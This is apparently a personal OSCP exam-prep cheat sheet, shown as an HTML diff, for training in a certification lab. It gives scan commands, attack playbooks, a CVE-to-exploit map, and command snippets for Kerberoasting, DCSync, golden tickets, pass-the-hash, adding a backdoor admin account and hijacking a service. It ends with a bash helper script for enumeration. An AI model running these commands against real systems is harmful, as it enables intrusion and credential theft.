+<h2 id="v0-0-the-scoreboard-know-exactly-what-wins">0) THE SCOREBOARD (know exactly what wins)<a class="anchor" href="#v0-0-the-scoreboard-know-exactly-what-wins">#</a></h2>
+<pre><code>100 pts total · need 70 · NO bonus points · 23h45m + 24h report
+┌─────────────────────────────┬───────┬──────────────────────────────┐
+│ AD SET (3 chained hosts)    │  40   │ all-or-nothing → DO FIRST     │
+│ Standalone A                │  20   │ 10 local.txt + 10 proof.txt   │
+│ Standalone B                │  20   │ 10 local.txt + 10 proof.txt   │
+│ Standalone C                │  20   │ 10 local.txt + 10 proof.txt   │
+└─────────────────────────────┴───────┴──────────────────────────────┘
+WINNING COMBOS (any = pass):
+  AD 40 + two boxes fully rooted (40) = 80 ✅   ← the target plan
+  AD 40 + one box rooted (20) + two low-priv flags (20) = 80 ✅
+  No AD, all three rooted (60) = 60 ✗  ← why AD is non-negotiable
+RULE OF THUMB: a low-priv flag (10) you can grab in 20 min beats 2h on a root you can&#x27;t reach.</code></pre>
+<h2 id="v0-05-[exam-rules-2026]-dont-get-points-voided-verify-on-the-current-official-guide">0.5) [EXAM-RULES-2026] ⛔ don&#x27;t get points VOIDED (verify on the current official guide)<a class="anchor" href="#v0-05-[exam-rules-2026]-dont-get-points-voided-verify-on-the-current-official-guide">#</a></h2>
+<pre><code>ALLOWED : your own notes (this KB), public exploits you understand + run manually,
+          nmap/NSE, nikto, dirb/feroxbuster/ffuf/gobuster, netexec/CME, impacket,
+          evil-winrm, BloodHound/SharpHound, PowerView, Rubeus, mimikatz, chisel/ligolo,
+          hashcat/john, msfvenom + multi/handler (on ALL boxes), searchsploit,
+          msf-pattern_create / nasm_shell. PowerShell Core / PSSession = a valid interactive shell.
+BANNED  : ⛔ AI / LLM chatbots during BOTH the exam AND the report phase (ChatGPT, KAI, etc.)
+          ⛔ sqlmap and other AUTO-exploitation tools (sqlninja, db_autopwn, browser_autopwn) — do SQLi MANUALLY
+          ⛔ mass/auto vuln scanners (Nessus, OpenVAS, Nexpose)
+          ⛔ Responder/Inveigh POISONING &amp; spoofing (LLMNR/NBNS/WPAD, `-w`), ARP/DNS spoof, bettercap
+             → Responder ANALYZE mode (`-A`) only; capture NTLM by hosting an SMB server that a
+               file (.scf/.url/.lnk) the victim opens authenticates to — that&#x27;s fine, poisoning is not
+          ⛔ commercial tools (Burp Pro, Metasploit Pro)
+METASPLOIT: modules (exploit/post) + Meterpreter = ONE target only; once used on a box you&#x27;re locked to it;
+            NOT for pivoting. (msfvenom + multi/handler are exempt and usable everywhere.)
+REVERTS  : 24 available; the limit can be reset ONCE if you run out.
+NOTE     : This KB is STATIC personal notes = allowed. Asking a live AI during the exam = banned. Comply.</code></pre>
+<h2 id="v0-[pre-exam-setup]-copy-paste-this-one-block-run-top-to-bottom">[PRE-EXAM-SETUP]  📋 copy-paste this (one block, run top-to-bottom)<a class="anchor" href="#v0-[pre-exam-setup]-copy-paste-this-one-block-run-top-to-bottom">#</a></h2>
+<h3 id="v0-a-the-day-before-one-time-15-min-full-detail-in-[kali-setup]">A) THE DAY BEFORE — one-time, ~15 min (full detail in <code class="tag">[KALI-SETUP]</code>)<a class="anchor" href="#v0-a-the-day-before-one-time-15-min-full-detail-in-[kali-setup]">#</a></h3>
+<pre><code>sudo apt update &amp;&amp; sudo apt full-upgrade -y
+sudo apt install -y seclists feroxbuster ffuf gobuster nikto smbclient smbmap enum4linux \
+  netexec impacket-scripts evil-winrm responder proxychains4 hashcat john hydra dnsrecon nmap
+pipx install bloodhound
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2&gt;/dev/null   # one time; ignore &quot;not found&quot; if already done
+# tools you COPY TO targets — download once into ~/tools (from each project&#x27;s GitHub Releases):
+mkdir -p ~/tools/{linux,windows}
+#   linux/  : linpeas.sh  pspy64  chisel  (ligolo) agent+proxy
+#   windows/: winPEASx64.exe  PrintSpoofer64.exe  GodPotato.exe  nc.exe  chisel.exe
+#             PowerView.ps1  PowerUp.ps1  SharpHound.exe  mimikatz.exe  RunasCs.exe
+# then TEST: VPN connects · screenshot tool works · notes app open · OSCP-KB.html pinned</code></pre>
+<h3 id="v0-b-exam-morning-first-5-min-run-these-once-the-clock-starts">B) EXAM MORNING — first 5 min (run these once the clock starts)<a class="anchor" href="#v0-b-exam-morning-first-5-min-run-these-once-the-clock-starts">#</a></h3>
+<pre><code># 1) connect the exam VPN, then confirm your address (this is your LHOST / $IP):
+ip addr show tun0 | grep inet
+# 2) build your workspace + start a command logger (saves everything for the report):
+mkdir -p ~/oscp/{AD1,AD2,AD3,ST-A,ST-B,ST-C}/{scans,loot,exploits,www}
+cd ~/oscp &amp;&amp; script -q session-$(date +%F).log
+# 3) serve your tools so targets can pull them (leave running in a tab):
+cd ~/tools/linux &amp;&amp; python3 -m http.server 80 &amp;
+# 4) set your Kali IP + per-target IP as shell vars so all KB commands paste-and-run:
+export IP=10.10.14.x            # &lt;-- your tun0 address from step 1 (LHOST)
+#    for each box you work:  T=&lt;target-ip&gt; ; cd ~/oscp/&lt;box&gt;    (then paste nmap etc. using $T)
+# 5) read the control-panel brief: starting creds? hostnames? domain? which IPs are AD vs standalone?</code></pre>
+<blockquote>After this, the folders (<code>scans/ loot/ …</code>) exist, so <code>nmap -oN scans/all-tcp.txt $T</code> won&#x27;t error, <code>$IP</code>/<code>$T</code> are set so commands paste cleanly, and every command is logged for your report. Then go to <strong>§1 / §2</strong> below.</blockquote>
+<h2 id="v0-1-pre-flight-day-before-first-10-min-[exam-day-flow]-phase-0">1) PRE-FLIGHT (day before + first 10 min)  → <code class="tag">[EXAM-DAY-FLOW]</code> Phase 0<a class="anchor" href="#v0-1-pre-flight-day-before-first-10-min-[exam-day-flow]-phase-0">#</a></h2>
+<pre><code>[ ] VPN, VM, screenshot tool, notes app all tested
+[ ] OSCP-KB.html pinned in a browser tab
+[ ] Folder skeleton + command logger ready:
+    mkdir -p ~/oscp/{AD1,AD2,AD3,ST-A,ST-B,ST-C}/{scans,loot,exploits,www}
+    script -q ~/oscp/session-$(date +%F).log
+[ ] Read the control-panel brief: starting creds? hostnames? domain? which IPs are AD vs standalone? → paste into notes
+[ ] Confirm each target IP responds (nmap -sn / -Pn)</code></pre>
+<h2 id="v0-2-launch-all-scans-in-parallel-first-2030-min-[nmap-quick]">2) LAUNCH ALL SCANS IN PARALLEL (first 20–30 min)  → <code class="tag">[NMAP-QUICK]</code><a class="anchor" href="#v0-2-launch-all-scans-in-parallel-first-2030-min-[nmap-quick]">#</a></h2>
+<p>Run per target in separate tabs. <strong>Don&#x27;t wait</strong> — while these run, start web enum on anything with 80/443.</p>
+<pre><code># fast all-ports (every target at once):
+nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt $T
+# then deep on the open ports:
+nmap -p&lt;csv&gt; -sCV -Pn -oN scans/scv.txt $T
+# UDP top-100 (backgrounded):
+nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt $T</code></pre>
+<p>As results land, route each port with <code class="tag">[ENUM-DECISION]</code> (Vol 1). <strong>Golden rule: map everything before exploiting anything.</strong></p>
+<hr>
+<h2 id="v0-25-[exam-order-debate]-which-target-first-two-valid-schools-pick-yours">2.5) [EXAM-ORDER-DEBATE] which target first? (two valid schools — pick yours)<a class="anchor" href="#v0-25-[exam-order-debate]-which-target-first-two-valid-schools-pick-yours">#</a></h2>
+<pre><code>SCHOOL A &quot;AD first&quot;:     do the AD set while your brain is freshest — it&#x27;s the 40-pt all-or-nothing
+                         block and the hardest to grind tired. (This KB&#x27;s default.)
+SCHOOL B &quot;bank first&quot;:   root 1–2 standalones first (cap ~4–5h) to lock guaranteed points + build
+                         momentum/confidence, THEN hit AD with a lead on the board.
+PICK: AD weak/nervous → School A (fresh brain on the hard thing). Want a safety cushion / calmer start
+      → School B. EITHER WAY: don&#x27;t leave AD until you&#x27;re too tired to think — it&#x27;s where 40 pts live.</code></pre>
+<h2 id="v0-3-the-three-playbooks-per-machine-follow-exactly">3) THE THREE PLAYBOOKS (per machine — follow exactly)<a class="anchor" href="#v0-3-the-three-playbooks-per-machine-follow-exactly">#</a></h2>
+<h3 id="v0--playbook-ad-set-do-first-hrs-058-worth-40-chained">🟥 PLAYBOOK: AD SET (do FIRST, ~hrs 0.5–8) — worth 40, chained<a class="anchor" href="#v0--playbook-ad-set-do-first-hrs-058-worth-40-chained">#</a></h3>
+<pre><code>STEP 1  Foothold the ENTRY host (treat it like a standalone):
+        web vuln / service exploit / provided cred → shell → stabilize [SHELL-QUICK]
+STEP 2  Loot locally: [WINDOWS-PRIVESC-QUICK] + [CREDENTIALS-SOURCES]
+        secretsdump/mimikatz, cmdkey, PS history, configs, files → collect EVERY cred/hash
+STEP 3  First domain credential → pivot the whole approach to AD:
+        sudo ntpdate $DC                                   # fix clock skew FIRST
+        bloodhound-python -u U -p P -d $DOMAIN -ns $DC -c all --zip   # collect NOW
+        impacket-GetUserSPNs -request $DOMAIN/U:P -dc-ip $DC          # Kerberoast → -m 13100
+        impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC  # AS-REP → -m 18200
+        nxc smb &lt;all-hosts&gt; -u U -p P --continue-on-success          # SPRAY every cred
+STEP 4  Follow BloodHound &quot;shortest path from Owned&quot; → execute edges [AD-ACL]:
+        crack a roast → reuse; ACL abuse (GenericAll/WriteDACL/ForceChangePassword);
+        lateral move [AD-LATERAL] (evil-winrm / wmiexec / psexec) → dump creds on each host → repeat
+STEP 5  Reach DC → [AD-DCSYNC]:  impacket-secretsdump $DOMAIN/U:P@$DC
+        → PtH Administrator to DC + member server + workstation → read ALL proof.txt
+DECISION: zero AD progress at ~3–4h → bank a standalone, return fresh (don&#x27;t burn the day here).
+TRICKS: (1) always Kerberoast+AS-REP even with low creds — free.  (2) spray EVERY new password on
+        EVERY host.  (3) service accounts are often admins — check their BloodHound node.
+        (4) clock skew masquerades as &quot;bad creds&quot; — ntpdate first.</code></pre>
+<h3 id="v0--playbook-standalone-linux-worth-20-1010">🟦 PLAYBOOK: STANDALONE LINUX — worth 20 (10+10)<a class="anchor" href="#v0--playbook-standalone-linux-worth-20-1010">#</a></h3>
+<pre><code>STEP 1  From scans → [ENUM-DECISION] → enumerate every service (Vol 1). Web? → full [WEB-QUICK].
+STEP 2  Foothold [FOOTHOLD-CHECKLIST], cheapest first:
+        default/weak creds → creds you already found → known-version exploit [EXPLOIT-RESEARCH]/[CVE-HITS]
+        → web vuln (upload&gt;cmdinj&gt;SQLi-RCE&gt;LFI-RCE&gt;SSTI)
+STEP 3  Shell → stabilize [SHELL-QUICK] (python pty; stty raw -echo; fg).
+        *** grab &amp; SCREENSHOT local.txt NOW ***  (10 pts banked):
+        cat local.txt; id; ip a        → screenshot all three together
+STEP 4  Privesc [LINUX-PRIVESC-QUICK] — first 4:
+        id; sudo -l; find / -perm -4000 2&gt;/dev/null; getcap -r / 2&gt;/dev/null   → then linpeas
+        Quick wins order: sudo(GTFOBins) → SUID(GTFOBins/PwnKit) → cron/writable script →
+        caps → creds in configs/history → kernel (DirtyPipe/PwnKit) LAST
+STEP 5  Root → *** SCREENSHOT proof.txt NOW ***: cat proof.txt; id; ip a
+        → loot /etc/shadow, SSH keys, configs for OTHER boxes.</code></pre>
+<h3 id="v0--playbook-standalone-windows-worth-20-1010">🟩 PLAYBOOK: STANDALONE WINDOWS — worth 20 (10+10)<a class="anchor" href="#v0--playbook-standalone-windows-worth-20-1010">#</a></h3>
+<pre><code>STEP 1  Enumerate services (SMB/HTTP/WinRM/MSSQL common) → [ENUM-DECISION].
+STEP 2  Foothold: creds+evil-winrm / SMB / web upload (aspx) / service exploit [CVE-HITS].
+STEP 3  Shell → *** SCREENSHOT local.txt NOW ***: type local.txt &amp; whoami &amp; ipconfig
+STEP 4  Privesc [WINDOWS-PRIVESC-QUICK] — first move:
+        whoami /priv   → SeImpersonate/SeAssignPrimaryToken? → PrintSpoofer/GodPotato = SYSTEM (instant win)
+        else: winPEAS + PowerUp Invoke-AllChecks → service perms / unquoted path / AlwaysInstallElevated /
+        saved creds (cmdkey→runas /savecred) / autologon reg
+STEP 5  SYSTEM → *** SCREENSHOT proof.txt NOW ***: type proof.txt &amp; whoami &amp; ipconfig
+        → secretsdump SAM/SYSTEM, LSASS, cmdkey, DPAPI for OTHER boxes.
+TRICK: SeImpersonate on a service/web/MSSQL account is the single most common Windows root path — check it first.</code></pre>
+<h2 id="v0-4-time-checkpoints-glance-at-the-clock-make-the-call">4) TIME CHECKPOINTS (glance at the clock, make the call)<a class="anchor" href="#v0-4-time-checkpoints-glance-at-the-clock-make-the-call">#</a></h2>
+<pre><code>Hr 0–0.5   all scans launched, brief read, folders ready
+Hr 0.5–8   AD SET (fresh brain). If dead at ~3–4h → switch to a standalone, return
+Hr 8–16    standalones, 30-min rotation. New cred → spray on ALL boxes
+Hr 10–15   SLEEP 4–6h (fatigue = tunnel vision; grinding tired loses points)
+Hr 16–20   re-attack stuck boxes fresh; grab remaining low-priv 10-pointers
+Hr 20–23   STOP HACKING. Verify every proof screenshot exists. Re-take missing ones NOW.
+           Enter all flags in the control panel.
++24h       write &amp; upload the report ([REPORTING]) — no report = no pass</code></pre>
+<h2 id="v0-5-always-try-quick-wins-the-point-grabbers-[chain-]-[found-]">5) ALWAYS-TRY QUICK WINS (the point-grabbers)  → <code>[CHAIN-*]</code>, <code>[FOUND-*]</code><a class="anchor" href="#v0-5-always-try-quick-wins-the-point-grabbers-[chain-]-[found-]">#</a></h2>
+<pre><code>□ Anonymous access: FTP anon, SMB null/guest, NFS showmount, LDAP anon, Redis/Mongo unauth
+□ Default/weak creds on every login (admin:admin, product defaults, Company1!, Season+Year!)
+□ Reuse EVERY found credential on EVERY service (SMB/WinRM/SSH/RDP/MSSQL/web/LDAP) + as other users
+□ searchsploit every versioned service/CMS → [CVE-HITS]
+□ Web: /robots.txt, source/JS for creds, dir+vhost brute, upload forms, ?param= for LFI/SQLi/cmdinj
+□ SNMP public → snmpwalk (creds in process args), zone transfer (dig axfr)
+□ SMB shares: GPP Groups.xml (cpassword), unattend.xml, scripts, .kdbx, backups
+□ Linux: sudo -l, SUID+GTFOBins, cron, caps, ~/.ssh, history, config passwords
+□ Windows: whoami /priv (SeImpersonate→Potato), cmdkey, unattend.xml, PS history, AlwaysInstallElevated
+□ AD: Kerberoast + AS-REP (free), BloodHound, spray, GPP</code></pre>
+<h2 id="v0-6-stuck-1530-rule-[stuck-protocol]">6) STUCK? (15/30 rule)  → <code class="tag">[STUCK-PROTOCOL]</code><a class="anchor" href="#v0-6-stuck-1530-rule-[stuck-protocol]">#</a></h2>
+<pre><code>15 min no progress → RE-READ your nmap/tool output; you missed a port/service/version/param
+30 min no new hypothesis → SWITCH target; write EXACTLY where you stopped
+Triggers to abandon: retrying variants, editing an exploit you don&#x27;t understand, brute-forcing on a hunch
+Broken shell/exploit → [TROUBLESHOOTING-QUICK]. Weird box behavior → REVERT (free).
+Re-enumerate after EVERY new access (user/host/subnet) — new surface appears.</code></pre>
+<h2 id="v0-7-proof-capture-do-not-lose-points-here-[reporting-checklist]">7) PROOF CAPTURE (do NOT lose points here)  → <code class="tag">[REPORTING-CHECKLIST]</code><a class="anchor" href="#v0-7-proof-capture-do-not-lose-points-here-[reporting-checklist]">#</a></h2>
+<pre><code>Every owned host, ONE screenshot showing all three together:
+  Linux:   cat proof.txt; id; ip a
+  Windows: type proof.txt &amp; whoami &amp; ipconfig
+Name files: &lt;host&gt;_&lt;ip&gt;_&lt;local|proof&gt;.png   e.g. web01_10.1.1.5_proof.png
+Enter each flag string in the control panel. Keep the command log (script) for report repro.
+Screenshot the EXPLOIT working too (not just the flag).</code></pre>
+<hr>
+<h1 id="v0-[cve-hits]-common-oscp-vulnerable-software-exploit-map">[CVE-HITS]  common OSCP vulnerable-software → exploit map<a class="anchor" href="#v0-[cve-hits]-common-oscp-vulnerable-software-exploit-map">#</a></h1>
+<p><strong>⚠️ VERIFY the exact version + arch + auth before running. This is a lead list, not a guarantee. Prefer the manual technique; MSF only on your ONE allowed box.</strong></p>
+<h3 id="v0-services-web-foothold">Services / Web (foothold)<a class="anchor" href="#v0-services-web-foothold">#</a></h3>
+<pre><code>vsftpd 2.3.4                → backdoor (CVE-2011-2523) → root shell on :6200
+ProFTPd 1.3.5               → mod_copy SITE CPFR/CPTO (CVE-2015-3306) → write webshell
+Samba 3.0.20–3.0.25         → usermap_script (CVE-2007-2447) → RCE
+Apache 2.4.49 / 2.4.50      → path traversal→RCE (CVE-2021-41773 / -42013)
+Shellshock (bash CGI)       → CVE-2014-6271, User-Agent: () { :;}; &lt;cmd&gt;
+PHP-CGI                     → CVE-2012-1823 (?-d args) → RCE
+Rejetto HFS 2.3             → CVE-2014-6287 → RCE (classic)
+Nostromo nhttpd             → CVE-2019-16278 path traversal RCE
+Webmin 1.890–1.920          → CVE-2019-15107 unauth RCE
+Drupal 7/8 &quot;Drupalgeddon2&quot;  → CVE-2018-7600 RCE
+Grafana 8.x                 → CVE-2021-43798 LFI (read config → creds)
+Tomcat                      → /manager default creds → deploy .war (msfvenom war); Ghostcat AJP CVE-2020-1938
+Jenkins                     → script console (Groovy) → RCE; often unauth
+phpMyAdmin                  → version LFI/RCE; SQL → INTO OUTFILE webshell
+WordPress                   → wpscan → vuln plugin/theme; admin → theme editor RCE
+ElasticSearch 1.x           → CVE-2015-1427 (Groovy) RCE
+Tiny File Manager           → default creds admin:admin@123 or user:12345 → UPLOAD a .php shell → RCE
+                              (also CVE-2021-45010 path traversal / CVE-2024-21646 auth issues on some vers)
+CMS Made Simple / Grav / SPIP / other CMS → searchsploit the exact version; many have auth-RCE / SQLi</code></pre>
+<blockquote><strong>Web-app foothold pattern (works for ANY app, not just the named ones):</strong> identify the app+version → (1) try <strong>default/weak creds</strong> → (2) <code>searchsploit &lt;app&gt; &lt;version&gt;</code> → (3) if you can log in, find an <strong>upload / editor / template</strong> feature → drop a webshell (<code class="tag">[WEB-UPLOAD]</code>). Named apps above are just common examples; the *pattern* is what matters.</blockquote>
+<h3 id="v0-windows-privesc-kernel">Windows privesc / kernel<a class="anchor" href="#v0-windows-privesc-kernel">#</a></h3>
+<pre><code>SeImpersonate/SeAssignToken → PrintSpoofer / GodPotato / JuicyPotatoNG / RoguePotato → SYSTEM
+PrintNightmare              → CVE-2021-1675 / CVE-2021-34527 (spooler) → SYSTEM/DC
+HiveNightmare / SeriousSAM  → CVE-2021-36934 (readable SAM) → hashes
+BITS arbitrary move         → CVE-2020-0787 (Bad Potato) older builds
+UAC bypass (consent)        → CVE-2019-1388 (older)
+SMBGhost                    → CVE-2020-0796 (SMBv3, risky/crashy)
+EternalBlue                 → MS17-010 (old, unpatched → SYSTEM)
+Unquoted path / weak svc DACL / AlwaysInstallElevated  → not CVEs, always check</code></pre>
+<h3 id="v0-linux-privesc-kernel">Linux privesc / kernel<a class="anchor" href="#v0-linux-privesc-kernel">#</a></h3>
+<pre><code>pkexec &quot;PwnKit&quot;            → CVE-2021-4034 (near-universal on old boxes) → root
+DirtyPipe                  → CVE-2022-0847 (kernel 5.8–5.16.11) → root
+DirtyCOW                   → CVE-2016-5195 (very old) → root
+sudo &quot;Baron Samedit&quot;       → CVE-2021-3156 → root
+sudo bypass -u#-1          → CVE-2019-14287 (sudo &lt;1.8.28, specific rule)
+Polkit/pkexec variants, screen 4.5, Netfilter, OverlayFS → suggester will flag; verify kernel+distro</code></pre>
+<h3 id="v0-active-directory">Active Directory<a class="anchor" href="#v0-active-directory">#</a></h3>
+<pre><code>Zerologon                  → CVE-2020-1472 (DC → reset machine acct → DCSync) — powerful, verify patch
+noPac / sAMAccountName     → CVE-2021-42278 + CVE-2021-42287 → DA from any user (impacket)
+PrintNightmare             → CVE-2021-34527 (spooler on DC) → SYSTEM on DC
+PetitPotam / coerce        → CVE-2021-36942 → relay to ADCS (ESC8) → DC
+ADCS ESC1–ESC8             → certipy (misconfigured templates → DA) [LOOK-UP]
+GPP cpassword              → decrypt Groups.xml (gpp-decrypt) → creds</code></pre>
+<hr>
+<h1 id="v0-[community-addendum]-extra-field-tested-commands-synthesized-from-public-oscp-notes">[COMMUNITY-ADDENDUM]  extra field-tested commands (synthesized from public OSCP notes)<a class="anchor" href="#v0-[community-addendum]-extra-field-tested-commands-synthesized-from-public-oscp-notes">#</a></h1>
+<h2 id="v0-[addendum-enum]">[ADDENDUM-ENUM]<a class="anchor" href="#v0-[addendum-enum]">#</a></h2>
+<pre><code>smbmap -H $T -u U -p P            # readable/writable shares at a glance (alt to nxc)
+smbmap -H $T -u &#x27;&#x27; -p &#x27;&#x27;          # null session
+nbtscan -r 192.168.x.0/24        # quick NetBIOS name sweep
+enum4linux -a $T                  # classic all-in-one (enum4linux-ng preferred)
+snmpwalk -v1 -c public $T 1.3.6.1.4.1.77.1.2.25   # Windows users OID
+snmpwalk -v1 -c public $T 1.3.6.1.2.1.25.4.2.1.2  # running processes (creds in args)
+dnsrecon -d domain -t axfr        # zone transfer; -t brt -D wordlist for brute</code></pre>
+<h2 id="v0-[addendum-web-cms]">[ADDENDUM-WEB-CMS]<a class="anchor" href="#v0-[addendum-web-cms]">#</a></h2>
+<pre><code>wpscan --url http://$T --enumerate vp,vt,u --api-token &lt;opt&gt;   # WordPress vuln plugins/themes/users
+# WP admin creds → Appearance&gt;Theme Editor → edit 404.php to PHP shell → RCE
+droopescan scan drupal -u http://$T          # Drupal
+droopescan scan joomla  -u http://$T          # Joomla (also joomscan)
+nikto -h http://$T                            # quick server misconfig/known-file sweep</code></pre>
+<h2 id="v0-[addendum-ad-powerview]-windows-side-enum-when-you-have-a-windows-shell">[ADDENDUM-AD-POWERVIEW]  (Windows-side enum, when you have a Windows shell)<a class="anchor" href="#v0-[addendum-ad-powerview]-windows-side-enum-when-you-have-a-windows-shell">#</a></h2>
+<pre><code># import: . .\PowerView.ps1
+Get-NetDomain ; Get-NetDomainController
+Get-NetUser | select samaccountname,description        # descriptions often hold creds
+Get-NetUser -SPN | select samaccountname,serviceprincipalname   # kerberoastable
+Get-DomainUser -PreauthNotRequired                     # AS-REP roastable
+Get-NetGroup &quot;Domain Admins&quot; -MemberIdentity          # DA members
+Get-NetComputer | select name,operatingsystem
+Find-LocalAdminAccess                                  # where current user is local admin
+Invoke-ShareFinder ; Get-NetGPPPassword               # GPP cpassword via PowerView</code></pre>
+<h2 id="v0-[addendum-ad-tickets]-recognize-mostly-post-da-or-specific">[ADDENDUM-AD-TICKETS]  (recognize; mostly post-DA or specific)<a class="anchor" href="#v0-[addendum-ad-tickets]-recognize-mostly-post-da-or-specific">#</a></h2>
+<pre><code># GPP password decrypt:
+impacket-Get-GPPPassword $DOMAIN/U:P@$DC   ;   gpp-decrypt &lt;cpassword&gt;
+# Golden ticket (after krbtgt hash via DCSync):
+impacket-ticketer -nthash &lt;krbtgt&gt; -domain-sid &lt;SID&gt; -domain $DOMAIN administrator
+# Silver ticket (service account hash → forge service ticket, recognize):
+#   mimikatz: kerberos::golden /sid /domain /target /service:&lt;spn&gt; /rc4:&lt;svc-hash&gt; /user:&lt;u&gt; /ptt
+# use ccache:  export KRB5CCNAME=administrator.ccache ; impacket-psexec -k -no-pass $DOMAIN/administrator@$DC</code></pre>
+<h2 id="v0-[addendum-lateral]">[ADDENDUM-LATERAL]<a class="anchor" href="#v0-[addendum-lateral]">#</a></h2>
+<pre><code>winrs -r:$T -u:U -p:P &quot;whoami&quot;               # native WinRM command (from a Windows host)
+nxc smb $T -u U -H &lt;ntlm&gt; --local-auth -x &#x27;whoami&#x27;   # PtH local admin command exec
+impacket-psexec/wmiexec/smbexec/atexec/dcomexec $DOMAIN/U:P@$T   # pick quietest that works</code></pre>
+<h2 id="v0-[addendum-pivot]">[ADDENDUM-PIVOT]<a class="anchor" href="#v0-[addendum-pivot]">#</a></h2>
+<pre><code>sshuttle -r U@$T 172.16.5.0/24              # VPN-like pivot over SSH (no proxychains needed) — easy
+# else Ligolo-ng (preferred) or Chisel SOCKS — see [PIVOT-QUICK]</code></pre>
+<h2 id="v0-[addendum-crack]">[ADDENDUM-CRACK]<a class="anchor" href="#v0-[addendum-crack]">#</a></h2>
+<pre><code>fcrackzip -u -D -p rockyou.txt secret.zip    # zip password (or zip2john + john)
+zip2john f.zip &gt; h ; office2john f.docx &gt; h ; keepass2john f.kdbx &gt; h ; ssh2john id_rsa &gt; h
+john h --wordlist=rockyou.txt   |   hashcat -m &lt;mode&gt; h rockyou.txt -O
+# online (only for practice/allowed, unsalted): CrackStation / hashes.com  — offline preferred on exam</code></pre>
+<h2 id="v0-[addendum-misc]">[ADDENDUM-MISC]<a class="anchor" href="#v0-[addendum-misc]">#</a></h2>
+<pre><code># add local admin (Windows, post-SYSTEM, for RDP/report repro):
+net user pentest P@ssw0rd123 /add &amp; net localgroup administrators pentest /add
+# RDP in:  xfreerdp /u:U /p:P /v:$T +clipboard /dynamic-resolution
+# reg-based service hijack (alt to sc config):
+reg add HKLM\SYSTEM\CurrentControlSet\services\&lt;svc&gt; /v ImagePath /t REG_EXPAND_SZ /d C:\temp\rev.exe /f</code></pre>
+<hr>
+<h1 id="v0-[exam-scripts]-exam-safe-automation-source-once-tiny-commands">[EXAM-SCRIPTS]  🤖 exam-safe automation (source once → tiny commands)<a class="anchor" href="#v0-[exam-scripts]-exam-safe-automation-source-once-tiny-commands">#</a></h1>
+<blockquote><strong>Companion files (same folder):</strong> <code>oscp.sh</code> (Bash — <code>source ~/oscp.sh</code>) · <code>oscp.py</code> (Python — <code>./oscp.py enum &lt;ip&gt;</code>) · **<code>OSCP-CommandGen.html</code><strong> (click-to-generate: set your IP → pick a category → Copy the ready-to-run command — reverse shells, transfer, enum, msfvenom, privesc downloads). ✅ </strong>Allowed:<strong> your own Python/Bash/Perl scripts for </strong>enumeration / setup / workflow<strong>, and </strong>AutoRecon / nmapAutomator** (they do *no* auto-exploitation). ⛔ <strong>Banned:</strong> automated *exploitation* (sqlmap, MSF autopwn, Armitage, AutoSploit, Cobalt Strike). <strong>Rule:</strong> automate enum, never exploitation; understand every line; run auto-enum <strong>in the background</strong> while you manually hit 80/443/445.</blockquote>
+<h2 id="v0-[exam-scripts-setup]-save-this-as-oscpsh-then-source-oscpsh-once-at-exam-start">[EXAM-SCRIPTS-SETUP]  save this as <code>~/oscp.sh</code>, then <code>source ~/oscp.sh</code> once at exam start<a class="anchor" href="#v0-[exam-scripts-setup]-save-this-as-oscpsh-then-source-oscpsh-once-at-exam-start">#</a></h2>
+<pre><code>#!/bin/bash
+# ---- OSCP helper: enumeration/setup/workflow ONLY (exam-compliant) ----
+_tun=$(ip -o -4 addr show tun0 2&gt;/dev/null | awk &#x27;{print $4}&#x27; | cut -d/ -f1); [ -n &quot;$_tun&quot; ] &amp;&amp; export IP=&quot;$_tun&quot;   # VPN IP (LHOST); if tun0 down, set manually: export IP=10.10.14.x
+
+ws(){  # ws &lt;name&gt; &lt;target-ip&gt;  → make workspace + set $T/$IP
+  mkdir -p ~/oscp/&quot;$1&quot;/{scans,loot,exploits,www}; cd ~/oscp/&quot;$1&quot; || return
+  export T=&quot;$2&quot;; echo &quot;[+] ~/oscp/$1 ready · \$T=$T · \$IP=$IP&quot;; }
+
+enum(){  # enum &lt;ip&gt;  → full TCP scan → -sCV on open ports → fan out to web/smb (BACKGROUND while you probe manually)
+  local t=${1:-$T}; mkdir -p scans
+  echo &quot;[*] full TCP scan $t ...&quot;; nmap -p- --min-rate 2000 -Pn -oN scans/all-tcp.txt &quot;$t&quot;
+  local p; p=$(grep -oE &#x27;^[0-9]+/tcp +open&#x27; scans/all-tcp.txt | cut -d/ -f1 | paste -sd, -)
+  echo &quot;[+] open: $p&quot;; nmap -p&quot;$p&quot; -sCV -Pn -oN scans/scv.txt &quot;$t&quot;
+  nmap -sU --top-ports 100 --min-rate 1000 -Pn -oN scans/udp.txt &quot;$t&quot; &amp;
+  [[ &quot;,$p,&quot; == *,80,* || &quot;,$p,&quot; == *,443,* || &quot;,$p,&quot; == *,8080,* ]] &amp;&amp; { echo &quot;[*] web&quot;; whatweb http://&quot;$t&quot;; feroxbuster -u http://&quot;$t&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html -o scans/ferox.txt &amp; }
+  [[ &quot;,$p,&quot; == *,445,* ]] &amp;&amp; { echo &quot;[*] smb&quot;; nxc smb &quot;$t&quot; -u &#x27;&#x27; -p &#x27;&#x27; --shares | tee scans/smb.txt; enum4linux-ng -A &quot;$t&quot; &gt; scans/enum4.txt &amp; }
+  [[ &quot;,$p,&quot; == *,88,* ]] &amp;&amp; echo &quot;[!] port 88 → this is a DC / AD → see [AD-QUICK]&quot;
+  echo &quot;[+] done → read scans/scv.txt, route each port via [ENUM-DECISION]&quot;; }
+
+spray(){  # spray &lt;user&gt; &lt;pass&gt; &lt;ip-or-hostfile&gt;  → VALIDATE one cred across services (allowed; not brute-force)
+  for s in smb winrm ldap mssql rdp ssh; do echo &quot;=== $s ===&quot;; nxc &quot;$s&quot; &quot;$3&quot; -u &quot;$1&quot; -p &quot;$2&quot; --continue-on-success 2&gt;/dev/null; done; }
+
+hosts(){  nxc smb &quot;$1&quot; 2&gt;/dev/null | grep -oE &#x27;([0-9]{1,3}\.){3}[0-9]{1,3}&#x27; | sort -u; }   # alive hosts on a subnet (post-pivot)
+flags(){  find / -iname &#x27;*flag*&#x27; 2&gt;/dev/null; grep -rniE &#x27;flag\{|OS\{|password|secret&#x27; /home /var/www /opt /etc 2&gt;/dev/null; }  # loot/flag hunt (run ON a Linux target)
